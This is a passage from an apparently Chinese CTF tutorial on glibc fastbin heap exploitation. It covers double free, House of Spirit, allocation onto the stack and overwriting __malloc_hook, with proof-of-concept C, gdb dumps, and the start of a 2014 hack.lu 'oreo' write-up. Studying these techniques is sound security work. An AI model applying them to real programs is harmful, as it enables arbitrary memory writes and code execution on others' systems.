    <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk2</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>

    <span class="n">chunk_a</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_a</span><span class="o">=&amp;</span><span class="n">bss_chunk</span><span class="p">;</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">chunk_b</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span><span class="n">chunk_b</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于 bss 段中正是我们之前设置的<code>CHUNK bss_chunk</code></p>
<div class="highlight"><pre><span></span><code>Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

0x601080 &lt;bss_chunk&gt;:   0x0000000000000000  0x0000000000000021
0x601090 &lt;bss_chunk+16&gt;:0x0000000000000000  0x0000000000000000
0x6010a0:               0x0000000000000000  0x0000000000000000
0x6010b0:               0x0000000000000000  0x0000000000000000
0x6010c0:               0x0000000000000000  0x0000000000000000
</code></pre></div>
<p>值得注意的是，我们在 main 函数的第一步就进行了<code>bss_chunk.size=0x21;</code>的操作，这是因为_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p>
<div class="highlight"><pre><span></span><code>*** Error in `./tst&#39;: malloc(): memory corruption (fast): 0x0000000000601090 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]
./tst[0x400636]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]
./tst[0x4004e9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0
7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0
7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0
7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0
7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0
7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0
7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
</code></pre></div>
<p>_int_malloc 中的校验如下</p>
<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">))</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">errstr</span> <span class="o">=</span> <span class="s">&quot;malloc(): memory corruption (fast)&quot;</span><span class="p">;</span>
    <span class="nl">errout</span><span class="p">:</span>
      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="n">errstr</span><span class="p">,</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">));</span>
      <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="_5">小总结<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p>
<h2 id="house-of-spirit">House Of Spirit<a class="headerlink" href="#house-of-spirit" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/85357">【技术分享】堆之House of Spirit</a></p>
<p><a href="https://paper.seebug.org/521/">PWN学习之house of系列(一)</a></p>
</blockquote>
<h3 id="_6">介绍<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配**指定地址**的 chunk 的目的。</p>
<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ul>
<p>至于为什么要绕过这些检测，可以参考 free 部分的源码。</p>
<h3 id="_7">演示<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>这里就直接以 how2heap 上的例子进行说明，如下</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates the house of spirit attack.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Calling malloc() once so that it sets up its memory.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
    <span class="c1">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">aligned</span> <span class="p">(</span><span class="mi">16</span><span class="p">)));</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_chunks</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">7</span><span class="p">]);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span> <span class="c1">// this is the size</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="c1">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1234</span><span class="p">;</span> <span class="c1">// nextsize</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">a</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Freeing the overwritten pointer.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(0x30): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div>
<p>运行后的效果如下</p>
<div class="highlight"><pre><span></span><code>➜  how2heap git:<span class="o">(</span>master<span class="o">)</span> ./house_of_spirit
This file demonstrates the house of spirit attack.
Calling malloc<span class="o">()</span> once so that it sets up its memory.
We will now overwrite a pointer to point to a fake <span class="s1">&#39;fastbin&#39;</span> region.
This region <span class="o">(</span>memory of length: <span class="m">80</span><span class="o">)</span> contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.
This chunk.size of this region has to be <span class="m">16</span> more than the region <span class="o">(</span>to accomodate the chunk data<span class="o">)</span> <span class="k">while</span> still falling into the fastbin category <span class="o">(</span>&lt;<span class="o">=</span> <span class="m">128</span> on x64<span class="o">)</span>. The PREV_INUSE <span class="o">(</span>lsb<span class="o">)</span> bit is ignored by free <span class="k">for</span> fastbin-sized chunks, however the IS_MMAPPED <span class="o">(</span>second lsb<span class="o">)</span> and NON_MAIN_ARENA <span class="o">(</span>third lsb<span class="o">)</span> bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="k">for</span> the malloc parameter at the end.
The chunk.size of the *next* fake region has to be sane. That is &gt; <span class="m">2</span>*SIZE_SZ <span class="o">(</span>&gt; <span class="m">16</span> on x64<span class="o">)</span> <span class="o">&amp;&amp;</span> &lt; av-&gt;system_mem <span class="o">(</span>&lt; 128kb by default <span class="k">for</span> the main arena<span class="o">)</span> to pass the nextsize integrity checks. No need <span class="k">for</span> fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.
... note that the memory address of the *region* associated with this chunk must be <span class="m">16</span>-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will <span class="k">return</span> the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!
malloc<span class="o">(</span>0x30<span class="o">)</span>: 0x7ffd9bceaa60
</code></pre></div>
<h3 id="_8">小总结<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p>
<h2 id="alloc-to-stack">Alloc to Stack<a class="headerlink" href="#alloc-to-stack" title="Permanent link">&para;</a></h2>
<h3 id="_9">介绍<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<p>如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。</p>
<p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
<h3 id="_10">演示<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p>
<div class="highlight"><pre><span></span><code>typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&amp;stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
</code></pre></div>
<p>通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p>
<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
0x602010:   0x00007fffffffde60  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk
</code></pre></div>
<p>之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行</p>
<div class="highlight"><pre><span></span><code>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;=== unsorted bin
0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;=== fastbin[0]
0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000
</code></pre></div>
<p>最终第二次 malloc 返回值为 0x00007fffffffde70 也就是 stack_chunk</p>
<div class="highlight"><pre><span></span><code>   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;
 → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax
   $rax   : 0x00007fffffffde70

0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
</code></pre></div>
<h3 id="_11">小总结<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p>
<h2 id="arbitrary-alloc">Arbitrary Alloc<a class="headerlink" href="#arbitrary-alloc" title="Permanent link">&para;</a></h2>
<h3 id="_12">介绍<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p>
<h3 id="_13">演示<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
<p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。**</p>
<div class="highlight"><pre><span></span><code>int main(void)
{


    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
</code></pre></div>
<p>这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p>
<div class="highlight"><pre><span></span><code>0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0
</code></pre></div>
<p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p>
<div class="highlight"><pre><span></span><code>//这里的size指用户区域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10]
Fastbins[idx=1, size=0x20]
Fastbins[idx=2, size=0x30]
Fastbins[idx=3, size=0x40]
Fastbins[idx=4, size=0x50]
Fastbins[idx=5, size=0x60]
Fastbins[idx=6, size=0x70]
</code></pre></div>
<p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p>
<div class="highlight"><pre><span></span><code>0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0

0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f
</code></pre></div>
<p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p>
<div class="highlight"><pre><span></span><code>##define fastbin_index(sz)                                                      \
    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
</code></pre></div>
<p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）</p>
<p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。</p>
<div class="highlight"><pre><span></span><code>0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;
 →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax

 $rax   : 0x7ffff7dd1afd

0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f
0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f
0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000
0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000
</code></pre></div>
<h3 id="_14">小总结<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p>
<h2 id="2014-hacklu-oreo">2014 hack.lu oreo<a class="headerlink" href="#2014-hacklu-oreo" title="Permanent link">&para;</a></h2>
<h3 id="_15">基本情况<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
<p>程序比较古老，32 位的堆题</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>Arch:     i386-32-little
RELRO:    No RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre></div>
</td></tr></table>
<h3 id="_16">基本功能<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
<p>存储枪支信息结构体：</p>
<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">rifle</span> <span class="p">{</span>
    <span class="n">description</span> <span class="c1">//从0字节开始</span>
    <span class="n">name</span> <span class="c1">//从25字节开始</span>
    <span class="n">pre_rifle_ptr</span> <span class="c1">//从52字节开始</span>
<span class="p">}</span> <span class="c1">//总共56字节</span>
</code></pre></div>
<ul>
<li>
<p>添加枪支，会读取枪支的名字与描述。读取的名字的长度为 56 ，可以覆盖后面堆块的数据。需要注意的是，枪支信息堆块大小固定为 0x40 （含chunk_header）。</p>
</li>
<li>
<p>展示添加枪支，即从头到尾输出枪支的描述与名字。</p>
</li>
<li>
<p>~~订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为 NULL。~~将最后添加的枪支释放，然后在释放当前堆最后 4 字节指向的内存地址，如果为 0 则结束释放。</p>
<div class="highlight"><pre><span></span><code>pwndbg&gt; x /20wx 0x0804b858-0x8
0x804b850:  0x00000000  0x00000041  0x64646464  0x64646464
0x804b860:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b870:  0x63636300  0x63636363  0x00000063  0x00000000
0x804b880:  0x00000000  0x00000000  0x00000000  0x0804b818&lt;--指向下一个堆
0x804b890:  0x00000000  0x00020771  0x00000000  0x00000000
</code></pre></div>
</li>
<li>
<p>留下订货消息</p>
</li>
<li>
<p>展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。</p>
</li>
</ul>
<h3 id="_17">漏洞<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
<p>create 的时候 name 和 description 都存在溢出的情况，两者可输入长度都是 56 字节。修改两者都是可以修改 chunk 指向的下一个 chunk 地址，也就是最后 4 字节，修改 desc 时还可以溢出修改下一个堆信息。</p>
<h3 id="_18">思路<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
<p>没有打开 PIE ，一开始想着 double free 然后改 got 表地址泄露 getshell 一条龙。但是有个大问题，chunk_ptr 只保存最后申请 chunk 的指针信息，换句话说就是申请一个新的 chunk ，旧指针就会被覆盖了，指针丢失了，无法完成 double free 。</p>
<p>最终使用 house of spirit getshell 。</p>
<ol>
<li>
<p>申请一个 chunk ，通过溢出将某个函数 got 表地址写入最后 4 个字节，用输出功能泄露 libc 地址。</p>
</li>
<li>
<p>申请 0x40 个 chunk ，用于后续伪造 fastbin 绕过 size check 检查。</p>
</li>
<li>
<p>溢出修改 chunk 最后 4 字节的下一个 chunk 指针，指向 0x0804A2A8 notice_ptr ，这个是作为 fake chunk 的 fd 位。</p>
</li>
<li>
<p>布置 0x0804A2A8 后面的 chunk 信息绕过检查，前面的绕过伪造已经在第一步完成。</p>
</li>
<li>
<p>提交信息（free all chunk），fastbin 就会得到这样的一组指针：</p>
<div class="highlight"><pre><span></span><code>0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL
</code></pre></div>
<p>到这里就得到一组任意写指针了。</p>
</li>
</ol>
<hr />
<p>申请 0x40 个 chunk 会记录在 chunk_num ，如果以 0x0804A2A8 为 fake chunk 的 fd 指针，那么 chunk_num 刚刚好就是 fake_chunk size 位：</p>
